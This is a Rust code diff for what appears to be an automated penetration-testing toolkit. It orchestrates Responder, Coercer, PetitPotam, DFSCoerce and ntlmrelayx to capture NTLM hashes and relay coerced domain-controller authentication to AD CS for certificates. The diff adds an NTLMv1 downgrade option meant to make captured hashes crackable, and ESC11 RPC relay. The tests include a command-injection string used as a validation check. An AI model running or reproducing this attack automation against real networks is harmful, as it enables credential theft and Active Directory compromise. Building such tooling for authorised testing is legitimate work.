@@ -21,14 +21,27 @@ use crate::ToolOutput;
 
 /// Start Responder on a network interface to capture NTLM hashes.
 ///
-/// Optional args: `interface` (default "eth0"), `analyze_mode`
+/// Optional args: `interface` (default "eth0"), `analyze_mode`,
+/// `force_ntlmv1`.
+///
+/// `force_ntlmv1` adds Responder's `--lm --disable-ess` flags, forcing clients
+/// with `LmCompatibilityLevel <= 2` to negotiate NetNTLMv1 instead of v2.
+/// Combined with the static server challenge the `coercion_tools` role pins in
+/// `Responder.conf` (`1122334455667788`), captured v1 hashes are crack.sh
+/// rainbow-table candidates. `analyze_mode` (`-A`) is a *passive* mode that
+/// captures nothing — it is NOT a downgrade flag, so the two knobs are
+/// independent (combining them is pointless: analyze mode never poisons, so no
+/// hash is captured to downgrade).
 pub async fn start_responder(args: &Value) -> Result<ToolOutput> {
     let interface = optional_str(args, "interface").unwrap_or("eth0");
     let analyze_mode = optional_bool(args, "analyze_mode").unwrap_or(false);
+    let force_ntlmv1 = optional_bool(args, "force_ntlmv1").unwrap_or(false);
 
     CommandBuilder::new("responder")
         .flag("-I", interface)
         .arg_if(analyze_mode, "-A")
+        .arg_if(force_ntlmv1, "--lm")
+        .arg_if(force_ntlmv1, "--disable-ess")
         .timeout_secs(30)
         .execute()
         .await
@@ -61,24 +74,17 @@ pub async fn coercer(args: &Value) -> Result<ToolOutput> {
     let password = optional_str(args, "password");
     let domain = optional_str(args, "domain");
 
-    let mut cmd = CommandBuilder::new("coercer")
+    CommandBuilder::new("coercer")
         .arg("coerce")
         .flag("-t", target)
         .flag("-l", listener)
         .arg("--always-continue")
-        .timeout_secs(120);
-
-    if let Some(u) = username {
-        cmd = cmd.flag("-u", u);
-    }
-    if let Some(p) = password {
-        cmd = cmd.flag("-p", p);
-    }
-    if let Some(d) = domain {
-        cmd = cmd.flag("-d", d);
-    }
-
-    cmd.execute().await
+        .flag_opt("-u", username)
+        .flag_opt("-p", password)
+        .flag_opt("-d", domain)
+        .timeout_secs(120)
+        .execute()
+        .await
 }
 
 /// Coerce NTLM authentication via MS-EFSR (PetitPotam).
@@ -92,25 +98,18 @@ pub async fn petitpotam(args: &Value) -> Result<ToolOutput> {
     let password = optional_str(args, "password");
     let domain = optional_str(args, "domain");
 
-    let mut cmd = CommandBuilder::new("coercer")
+    CommandBuilder::new("coercer")
         .arg("coerce")
         .flag("-t", target)
         .flag("-l", listener)
         .args(["--filter-protocol-name", "MS-EFSR"])
         .arg("--always-continue")
-        .timeout_secs(60);
-
-    if let Some(u) = username {
-        cmd = cmd.flag("-u", u);
-    }
-    if let Some(p) = password {
-        cmd = cmd.flag("-p", p);
-    }
-    if let Some(d) = domain {
-        cmd = cmd.flag("-d", d);
-    }
-
-    cmd.execute().await
+        .flag_opt("-u", username)
+        .flag_opt("-p", password)
+        .flag_opt("-d", domain)
+        .timeout_secs(60)
+        .execute()
+        .await
 }
 
 /// Coerce NTLM authentication via MS-DFSNM (DFSCoerce).
@@ -124,22 +123,15 @@ pub async fn dfscoerce(args: &Value) -> Result<ToolOutput> {
     let password = optional_str(args, "password");
     let domain = optional_str(args, "domain");
 
-    let mut cmd = CommandBuilder::new("dfscoerce")
+    CommandBuilder::new("dfscoerce")
         .arg(listener)
         .arg(target)
-        .timeout_secs(60);
-
-    if let Some(u) = username {
-        cmd = cmd.flag("-u", u);
-    }
-    if let Some(p) = password {
-        cmd = cmd.flag("-p", p);
-    }
-    if let Some(d) = domain {
-        cmd = cmd.flag("-d", d);
-    }
-
-    cmd.execute().await
+        .flag_opt("-u", username)
+        .flag_opt("-p", password)
+        .flag_opt("-d", domain)
+        .timeout_secs(60)
+        .execute()
+        .await
 }
 
 /// Standalone-relay BUSY response. Standalone `ntlmrelayx_to_*` tools share
@@ -244,6 +236,12 @@ struct RelayCoerceConfig {
     /// `Some("rpc://<ca_host>")` for ESC11 (RPC ICPR enrollment) — same
     /// listener+coerce machinery, different target endpoint.
     relay_target_url: Option<String>,
+    /// CA common name for the ESC11 ICPR request (`certipy find` reports it
+    /// as `CA Name`). Required whenever `relay_target_url` is an `rpc://`
+    /// URL: ntlmrelayx binds the ICPR interface only under
+    /// `-rpc-mode ICPR`, and `ICertPassage` needs the CA name to route the
+    /// request. Unused on the ESC8 HTTP path.
+    icpr_ca_name: Option<String>,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -338,6 +336,23 @@ fn parse_relay_coerce_args(args: &Value) -> Result<RelayCoerceConfig> {
         }
     }
 
+    let icpr_ca_name = optional_str(args, "icpr_ca_name")
+        .map(str::trim)
+        .filter(|s| !s.is_empty());
+    if let Some(name) = icpr_ca_name {
+        if name.contains('\n') || name.contains('\'') {
+            anyhow::bail!("icpr_ca_name contains forbidden character (newline or single-quote)");
+        }
+    }
+    if relay_target_url.is_some_and(|u| u.starts_with("rpc://")) && icpr_ca_name.is_none() {
+        anyhow::bail!(
+            "relay_and_coerce: an rpc:// relay target is an ESC11 ICPR request and requires \
+             'icpr_ca_name' (the CA common name from `certipy find`). Without it ntlmrelayx \
+             relays to the task-scheduler interface instead of ICertPassage and never requests \
+             a certificate."
+        );
+    }
+
     Ok(RelayCoerceConfig {
         ca_host: ca_host.to_string(),
         coerce_target: coerce_target.to_string(),
@@ -347,10 +362,43 @@ fn parse_relay_coerce_args(args: &Value) -> Result<RelayCoerceConfig> {
         coerce_secret,
         template: template.to_string(),
         relay_target_url: relay_target_url.map(String::from),
+        icpr_ca_name: icpr_ca_name.map(String::from),
     })
 }
 
-// === Trait-based execution seam =====================================
+/// Build the ntlmrelayx argument vector for the relay phase.
+///
+/// An `rpc://` target is an ESC11 ICPR enrollment: ntlmrelayx picks the RPC
+/// interface to bind from `-rpc-mode`, which defaults to `TSCH`, and its TSCH
+/// attack aborts with `No command provided to attack` when no `-c` is given.
+/// Both `-rpc-mode ICPR` and `-icpr-ca-name` are therefore mandatory on that
+/// path; `--template` is read by the ICPR attack the same way the HTTP AD CS
+/// attack reads it. HTTP targets keep the ESC8 argument vector unchanged.
+fn build_relay_args(target_url: &str, template: &str, icpr_ca_name: Option<&str>) -> Vec<String> {
+    let mut args: Vec<String> = vec![
+        "-t".into(),
+        target_url.into(),
+        "--adcs".into(),
+        "--template".into(),
+        template.into(),
+        "-smb2support".into(),
+        "--keep-relaying".into(),
+        "--no-da".into(),
+        "--no-acl".into(),
+        "--no-validate-privs".into(),
+        "--no-dump".into(),
+    ];
+    if target_url.starts_with("rpc://") {
+        if let Some(ca) = icpr_ca_name.map(str::trim).filter(|s| !s.is_empty()) {
+            args.push("-rpc-mode".into());
+            args.push("ICPR".into());
+            args.push("-icpr-ca-name".into());
+            args.push(ca.into());
+        }
+    }
+    args
+}
+
 //
 // The phase-progression logic (spawn relay → run coerce phases → poll
 // log → extract cert) is exercised by unit tests via FakeCoerceProcs,
@@ -375,6 +423,7 @@ trait CoerceProcs {
         &self,
         target_url: &str,
         template: &str,
+        icpr_ca_name: Option<&str>,
         relay_log: &Path,
         workdir: &Path,
     ) -> Result<Self::Handle>;
@@ -429,11 +478,28 @@ impl RunOptions {
     }
 }
 
+/// True when `ip` parses as a routable address bound to a local interface.
+/// Rejects loopback, unspecified and multicast addresses outright.
+pub(crate) fn is_local_interface_ip(ip: &str) -> bool {
+    use std::net::{IpAddr, UdpSocket};
+    let parsed: IpAddr = match ip.parse() {
+        Ok(addr) => addr,
+        Err(_) => return false,
+    };
+    if parsed.is_loopback() || parsed.is_unspecified() || parsed.is_multicast() {
+        return false;
+    }
+    UdpSocket::bind((parsed, 0)).is_ok()
+}
+
 /// Wait for the given TCP port to become free on `0.0.0.0`. Polls every
 /// 250ms via a connect probe to `127.0.0.1:<port>`; a connection refused
 /// means nothing is listening. Returns `Ok(())` as soon as the port is
 /// free, `Err(reason)` if `timeout` elapses while it's still held.
-async fn wait_for_port_free(port: u16, timeout: Duration) -> std::result::Result<(), String> {
+pub(crate) async fn wait_for_port_free(
+    port: u16,
+    timeout: Duration,
+) -> std::result::Result<(), String> {
     use tokio::net::TcpStream;
     let deadline = std::time::Instant::now() + timeout;
     let addr = format!("127.0.0.1:{port}");
@@ -466,9 +532,11 @@ async fn wait_for_port_free(port: u16, timeout: Duration) -> std::result::Result
     }
 }
 
-// --- Real (production) implementation -------------------------------
-
 struct RealCoerceProcs;
+
+/// Long-lived relay binary. Named once so the span attributes and the spawned
+/// program cannot drift apart.
+const RELAY_BIN: &str = "impacket-ntlmrelayx";
 
 struct RealRelayHandle {
     child: Child,
@@ -497,15 +565,7 @@ impl CoerceProcs for RealCoerceProcs {
     type Handle = RealRelayHandle;
 
     fn is_local_ip(&self, ip: &str) -> bool {
-        use std::net::{IpAddr, UdpSocket};
-        let parsed: IpAddr = match ip.parse() {
-            Ok(addr) => addr,
-            Err(_) => return false,
-        };
-        if parsed.is_loopback() || parsed.is_unspecified() || parsed.is_multicast() {
-            return false;
-        }
-        UdpSocket::bind((parsed, 0)).is_ok()
+        is_local_interface_ip(ip)
     }
 
     fn list_local_ips(&self) -> Vec<String> {
@@ -546,14 +606,12 @@ impl CoerceProcs for RealCoerceProcs {
             "Responder.py",
             "impacket-petitpotam",
         ] {
-            let _ = TokioCommand::new("pkill")
+            let _ = CommandBuilder::new("pkill")
                 .arg("-f")
                 .arg(pat)
-                .stdin(Stdio::null())
-                .stdout(Stdio::null())
-                .stderr(Stdio::null())
                 .current_dir(workdir)
-                .status()
+                .timeout_secs(10)
+                .execute()
                 .await;
         }
         sleep(Duration::from_millis(500)).await;
@@ -563,6 +621,7 @@ impl CoerceProcs for RealCoerceProcs {
         &self,
         target_url: &str,
         template: &str,
+        icpr_ca_name: Option<&str>,
         relay_log: &Path,
         workdir: &Path,
     ) -> Result<Self::Handle> {
@@ -573,25 +632,30 @@ impl CoerceProcs for RealCoerceProcs {
         // them (and not in the worker's `/`). --keep-relaying prevents the
         // first inbound (often anonymous) connection from causing "All targets
         // processed!" before the real coerced DC calls back.
-        let child = TokioCommand::new("impacket-ntlmrelayx")
-            .arg("-t")
-            .arg(target_url)
-            .arg("--adcs")
-            .arg("--template")
-            .arg(template)
-            .arg("-smb2support")
-            .arg("--keep-relaying")
-            .arg("--no-da")
-            .arg("--no-acl")
-            .arg("--no-validate-privs")
-            .arg("--no-dump")
-            .current_dir(workdir)
-            .stdin(Stdio::piped())
-            .stdout(Stdio::from(relay_log_out))
-            .stderr(Stdio::from(relay_log_err))
-            .kill_on_drop(true)
-            .spawn()
+        let relay_args: Vec<String> = build_relay_args(target_url, template, icpr_ca_name);
+        let redacted_cmd = crate::redact::redact_command_line(RELAY_BIN, &relay_args);
+        let span = tracing::info_span!(
+            "exec.relay",
+            otel.name = "exec.impacket-ntlmrelayx",
+            otel.kind = "client",
+            "process.executable.name" = RELAY_BIN,
+            "process.command_line" = %redacted_cmd,
+            "process.command_args.count" = relay_args.len(),
+            "relay.pid" = tracing::field::Empty,
+        );
+        let child = span
+            .in_scope(|| {
+                TokioCommand::new(RELAY_BIN)
+                    .args(&relay_args)
+                    .current_dir(workdir)
+                    .stdin(Stdio::piped())
+                    .stdout(Stdio::from(relay_log_out))
+                    .stderr(Stdio::from(relay_log_err))
+                    .kill_on_drop(true)
+                    .spawn()
+            })
             .context("failed to spawn impacket-ntlmrelayx (is it installed?)")?;
+        span.record("relay.pid", child.id().unwrap_or(0));
         Ok(RealRelayHandle { child })
     }
 
@@ -604,20 +668,27 @@ impl CoerceProcs for RealCoerceProcs {
         cwd: &Path,
         timeout_secs: u64,
     ) {
-        let mut cmd = TokioCommand::new(bin);
-        for a in args {
-            cmd.arg(a);
-        }
-        cmd.current_dir(cwd).stdin(Stdio::null());
-        let timeout = Duration::from_secs(timeout_secs);
-        match tokio::time::timeout(timeout, cmd.output()).await {
-            Ok(Ok(out)) => append_output(coerce_log, header, &out).await,
-            Ok(Err(e)) => append_error(coerce_log, header, &format!("spawn failed: {e}")).await,
-            Err(_) => {
+        let result = CommandBuilder::new(bin)
+            .args(args.iter().map(|a| (*a).to_string()))
+            .current_dir(cwd)
+            .timeout_secs(timeout_secs)
+            .execute()
+            .await;
+        match result {
+            Ok(out) => append_output(coerce_log, header, &out.stdout, &out.stderr).await,
+            Err(e) if crate::executor::spawn_error_kind(&e).is_some() => {
+                append_error(coerce_log, header, &format!("spawn failed: {e}")).await
+            }
+            // Not necessarily a timeout: `execute()` folds the timeout in with
+            // join errors, stdin-write failures, and non-spawn execution
+            // errors. Report the error itself — the executor's timeout variant
+            // already says "command timed out after ..." — so the coerce log
+            // keeps distinguishing a real timeout from a silent tool failure.
+            Err(e) => {
                 append_error(
                     coerce_log,
                     header,
-                    &format!("timed out after {timeout_secs}s"),
+                    &format!("failed within {timeout_secs}s budget: {e}"),
                 )
                 .await
             }
@@ -788,7 +859,13 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
         None => format!("http://{}/certsrv/certfnsh.asp", cfg.ca_host),
     };
     let mut relay = procs
-        .spawn_relay(&target_url, &cfg.template, &relay_log, &workdir)
+        .spawn_relay(
+            &target_url,
+            &cfg.template,
+            cfg.icpr_ca_name.as_deref(),
+            &relay_log,
+            &workdir,
+        )
         .await?;
 
     // Give it a moment to bind ports; if it died, surface RELAY_BIND_FAILED.
@@ -981,7 +1058,12 @@ fn coerce_secret_args(secret: Option<&CoerceSecret>) -> Vec<String> {
     }
 }
 
-async fn append_output(path: &Path, header: &str, output: &std::process::Output) {
+/// Append one phase's captured output under a `=== <header> ===` banner.
+///
+/// The wire format is `"=== " header " ===\n" stdout stderr "\n"` — the same
+/// byte sequence the pre-`CommandBuilder` version wrote from a
+/// `std::process::Output`, now fed the executor's UTF-8 sanitized fields.
+async fn append_output(path: &Path, header: &str, stdout: &str, stderr: &str) {
     use tokio::io::AsyncWriteExt;
     if let Ok(mut f) = tokio::fs::OpenOptions::new()
         .create(true)
@@ -992,9 +1074,10 @@ async fn append_output(path: &Path, header: &str, output: &std::process::Output)
         let _ = f.write_all(b"=== ").await;
         let _ = f.write_all(header.as_bytes()).await;
         let _ = f.write_all(b" ===\n").await;
-        let _ = f.write_all(&output.stdout).await;
-        let _ = f.write_all(&output.stderr).await;
+        let _ = f.write_all(stdout.as_bytes()).await;
+        let _ = f.write_all(stderr.as_bytes()).await;
         let _ = f.write_all(b"\n").await;
+        let _ = f.flush().await;
     }
 }
 
@@ -1011,6 +1094,7 @@ async fn append_error(path: &Path, header: &str, msg: &str) {
         let _ = f.write_all(b" ===\n[ERROR] ").await;
         let _ = f.write_all(msg.as_bytes()).await;
         let _ = f.write_all(b"\n").await;
+        let _ = f.flush().await;
     }
 }
 
@@ -1018,11 +1102,12 @@ async fn poll_for_cert(relay_log: &Path, max: Duration, interval: Duration) -> b
     let deadline = Instant::now() + max;
     loop {
         if let Ok(s) = tokio::fs::read_to_string(relay_log).await {
-            // `--adcs` writes "GOT CERTIFICATE! ID <n>" then "Writing PKCS#12 …".
-            // `--ldap` userCertificate writes "Base64 certificate of user …".
-            if s.contains("Base64 certificate of user")
-                || s.contains("GOT CERTIFICATE!")
+            // `--adcs` writes "GOT CERTIFICATE! ID <n>" then "Writing PKCS#12 …",
+            // falling back to a base64 console dump when the file write fails.
+            if s.contains("GOT CERTIFICATE!")
                 || s.contains("Writing PKCS#12 certificate to")
+                || s.contains("Base64-encoded PKCS#12 certificate (")
+                || s.contains("Base64 certificate of user")
             {
                 return true;
             }
@@ -1114,22 +1199,32 @@ fn parse_relayed_user(line: &str) -> Option<String> {
     Some(candidate.to_string())
 }
 
-/// Parse the relay.log for the LAST captured cert. ntlmrelayx prints
-/// `Base64 certificate of user <NAME>` followed by the base64 blob on the
-/// next non-empty line. Returns (user, base64_blob).
+/// Parse the relay.log for the LAST captured cert, from the console fallback
+/// impacket takes when it cannot write the pfx to disk. Both spellings are
+/// accepted: `Base64-encoded PKCS#12 certificate (<NAME>):` since 0.12.0, and
+/// `Base64 certificate of user <NAME>` before it. Either way the base64 blob
+/// lands on the next non-empty line. Returns (user, base64_blob).
 fn extract_cert_from_log(log: &str) -> Option<(String, String)> {
+    const B64_MODERN: &str = "Base64-encoded PKCS#12 certificate (";
+    const B64_LEGACY: &str = "Base64 certificate of user ";
+
     let mut last_user: Option<String> = None;
     let mut last_b64: Option<String> = None;
     let mut pending_user: Option<String> = None;
 
     for line in log.lines() {
-        if let Some(idx) = line.find("Base64 certificate of user ") {
-            let after = &line[idx + "Base64 certificate of user ".len()..];
-            let name = after
-                .split_whitespace()
-                .next()
-                .unwrap_or("")
-                .trim_end_matches(':');
+        let named = line
+            .find(B64_MODERN)
+            .and_then(|i| line[i + B64_MODERN.len()..].split(')').next())
+            .or_else(|| {
+                line.find(B64_LEGACY).and_then(|i| {
+                    line[i + B64_LEGACY.len()..]
+                        .split_whitespace()
+                        .next()
+                        .map(|n| n.trim_end_matches(':'))
+                })
+            });
+        if let Some(name) = named {
             if !name.is_empty() {
                 pending_user = Some(name.to_string());
             }
@@ -1206,6 +1301,13 @@ mod tests {
     async fn start_responder_analyze_mode() {
         mock::push(mock::success());
         let args = json!({"interface": "eth1", "analyze_mode": true});
+        assert!(start_responder(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn start_responder_force_ntlmv1() {
+        mock::push(mock::success());
+        let args = json!({"interface": "eth1", "force_ntlmv1": true});
         assert!(start_responder(&args).await.is_ok());
     }
 
@@ -1390,10 +1492,91 @@ mod tests {
             "ca_host": "192.168.58.10",
             "coerce_target": "192.168.58.20",
             "attacker_ip": "192.168.58.100",
-            "relay_target_url": "rpc://192.168.58.10"
+            "relay_target_url": "rpc://192.168.58.10",
+            "icpr_ca_name": "contoso-CA01-CA"
         });
         let cfg = super::parse_relay_coerce_args(&args).expect("rpc target should parse");
         assert_eq!(cfg.relay_target_url.as_deref(), Some("rpc://192.168.58.10"));
+        assert_eq!(cfg.icpr_ca_name.as_deref(), Some("contoso-CA01-CA"));
+    }
+
+    #[test]
+    fn parse_relay_coerce_args_rejects_rpc_relay_target_without_ca_name() {
+        let args = json!({
+            "ca_host": "192.168.58.10",
+            "coerce_target": "192.168.58.20",
+            "attacker_ip": "192.168.58.100",
+            "relay_target_url": "rpc://192.168.58.10"
+        });
+        let err = super::parse_relay_coerce_args(&args)
+            .expect_err("an rpc target without a CA name cannot request a certificate");
+        assert!(
+            err.to_string().contains("icpr_ca_name"),
+            "unexpected error: {err}"
+        );
+    }
+
+    #[test]
+    fn parse_relay_coerce_args_ignores_blank_icpr_ca_name_on_http_target() {
+        let args = json!({
+            "ca_host": "192.168.58.10",
+            "coerce_target": "192.168.58.20",
+            "attacker_ip": "192.168.58.100",
+            "icpr_ca_name": "   "
+        });
+        let cfg = super::parse_relay_coerce_args(&args).expect("esc8 args should parse");
+        assert!(cfg.icpr_ca_name.is_none());
+    }
+
+    #[test]
+    fn parse_relay_coerce_args_rejects_shell_metacharacters_in_icpr_ca_name() {
+        let args = json!({
+            "ca_host": "192.168.58.10",
+            "coerce_target": "192.168.58.20",
+            "attacker_ip": "192.168.58.100",
+            "relay_target_url": "rpc://192.168.58.10",
+            "icpr_ca_name": "contoso'`whoami`"
+        });
+        let err =
+            super::parse_relay_coerce_args(&args).expect_err("single-quote should be rejected");
+        assert!(
+            err.to_string().contains("forbidden character"),
+            "unexpected error: {err}"
+        );
+    }
+
+    #[test]
+    fn relay_args_for_http_target_carry_no_rpc_mode() {
+        let args = super::build_relay_args(
+            "http://192.168.58.10/certsrv/certfnsh.asp",
+            "DomainController",
+            None,
+        );
+        assert!(
+            !args.iter().any(|a| a == "-rpc-mode"),
+            "ESC8 argv must stay unchanged: {args:?}"
+        );
+        assert!(args.iter().any(|a| a == "--adcs"));
+    }
+
+    #[test]
+    fn relay_args_for_rpc_target_request_icpr_mode_and_ca_name() {
+        let args = super::build_relay_args(
+            "rpc://192.168.58.10",
+            "DomainController",
+            Some("contoso-CA01-CA"),
+        );
+        let mode = args
+            .iter()
+            .position(|a| a == "-rpc-mode")
+            .expect("rpc target must select an RPC attack mode");
+        assert_eq!(args[mode + 1], "ICPR");
+        let ca = args
+            .iter()
+            .position(|a| a == "-icpr-ca-name")
+            .expect("ICPR request must name the CA");
+        assert_eq!(args[ca + 1], "contoso-CA01-CA");
+        assert!(args.iter().any(|a| a == "--adcs"));
     }
 
     #[test]
@@ -1443,7 +1626,7 @@ mod tests {
         );
     }
 
-    // ── Phase-progression coverage via FakeCoerceProcs ─────────────────────
+    // Phase-progression coverage via FakeCoerceProcs
 
     use std::collections::{HashMap, HashSet};
     use std::sync::Mutex;
@@ -1483,7 +1666,7 @@ mod tests {
             Self {
                 state: Mutex::new(FakeState {
                     is_local_ip: true,
-                    local_ips: vec!["10.0.0.1".into()],
+                    local_ips: vec!["192.168.58.1".into()],
                     binaries_present: ["petitpotam".to_string()].into_iter().collect(),
                     relay_early_exit: None,
                     relay_initial_log: Vec::new(),
@@ -1589,6 +1772,7 @@ mod tests {
             &self,
             _target_url: &str,
             _template: &str,
+            _icpr_ca_name: Option<&str>,
             relay_log: &Path,
             _workdir: &Path,
         ) -> Result<Self::Handle> {
@@ -1688,6 +1872,7 @@ mod tests {
             coerce_secret: None,
             template: "DomainController".into(),
             relay_target_url: None,
+            icpr_ca_name: None,
         }
     }
 
@@ -1703,6 +1888,7 @@ mod tests {
             )),
             template: "DomainController".into(),
             relay_target_url: None,
+            icpr_ca_name: None,
         }
     }
 
@@ -1929,6 +2115,21 @@ MIIBlahSecondCert==\n\
     }
 
     #[test]
+    fn extract_cert_from_log_reads_impacket_0_13_console_fallback() {
+        // impacket >=0.12 renamed the marker and sanitises `$` out of the name.
+        let log = "\
+[*] GOT CERTIFICATE! ID 42\n\
+[*] Writing PKCS#12 certificate to /home/kali/loot/DC01.pfx\n\
+[*] Unable to write certificate to file, printing B64 of certificate to console instead\n\
+[*] Base64-encoded PKCS#12 certificate (DC01): \n\
+MIIBlahModernCert==\n\
+[*] done\n";
+        let (user, b64) = super::extract_cert_from_log(log).expect("should extract");
+        assert_eq!(user, "DC01");
+        assert_eq!(b64, "MIIBlahModernCert==");
+    }
+
+    #[test]
     fn extract_cert_from_log_returns_none_without_marker() {
         let log = "[*] Servers started\n[*] no auth received\n";
         assert!(super::extract_cert_from_log(log).is_none());
@@ -2001,6 +2202,38 @@ MIIBlahSecondCert==\n\
         mock::push(mock::success());
         let args = json!({});
         assert!(ntlmrelayx_multirelay(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn append_output_writes_banner_then_stdout_then_stderr() {
+        let dir = tempfile::tempdir().unwrap();
+        let log = dir.path().join("coerce.log");
+        super::append_output(
+            &log,
+            "DFSCoerce",
+            "coerced 192.168.58.20\n",
+            "warn: retry\n",
+        )
+        .await;
+        let bytes = std::fs::read(&log).unwrap();
+        assert_eq!(
+            bytes,
+            b"=== DFSCoerce ===\ncoerced 192.168.58.20\nwarn: retry\n\n",
+            "framing drifted: {:?}",
+            String::from_utf8_lossy(&bytes)
+        );
+    }
+
+    #[tokio::test]
+    async fn append_error_writes_banner_then_error_marker() {
+        let dir = tempfile::tempdir().unwrap();
+        let log = dir.path().join("coerce.log");
+        super::append_error(&log, "DFSCoerce", "timed out after 25s").await;
+        let text = std::fs::read_to_string(&log).unwrap();
+        assert_eq!(
+            text, "=== DFSCoerce ===\n[ERROR] timed out after 25s\n",
+            "framing drifted: {text}"
+        );
     }
 
     #[tokio::test]
